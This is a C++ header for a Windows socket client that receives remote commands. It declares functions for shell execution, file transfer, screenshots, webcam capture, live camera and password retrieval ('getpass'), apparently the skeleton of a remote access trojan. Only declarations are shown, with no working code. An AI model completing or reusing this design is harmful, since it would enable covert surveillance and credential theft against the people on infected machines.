#ifndef CLIENT_HPP
#define CLIENT_HPP

#include <WinSock2.h>
#include <unordered_map>
#include <WS2tcpip.h>
#include <iostream>
#include <string>
#include <cstdio>
#include <cstdlib>   // Needed for _wtoi
#define BUFFER_SIZE (2048)

struct Commands
{
    void print_help();
    void clear_screen();
    void download(char* filefrom, char* fileto);
    void upload(char* filefrom, char* fileto);
    void screenshot(char* outpath);
    void webcam_snap(char* output);
    void livecam();
    void getpass();
};


class Client : Commands 
{
public:
    Client(std::wstring chost, unsigned short int cport);
    void create_socket();
    bool connect_socket();
    bool check_connection();
    void print_output(const char* output_str);
    int receive_commands();
    int run_shell_commands(const char* cmd);
    void close_connection();

private:
    WSADATA wsaData;
    struct sockaddr_in addr;
    SOCKET socket = INVALID_SOCKET;
    char rdata[BUFFER_SIZE];
    std::wstring server;
    unsigned short int port;
};

#endif //CLIENT_HPP
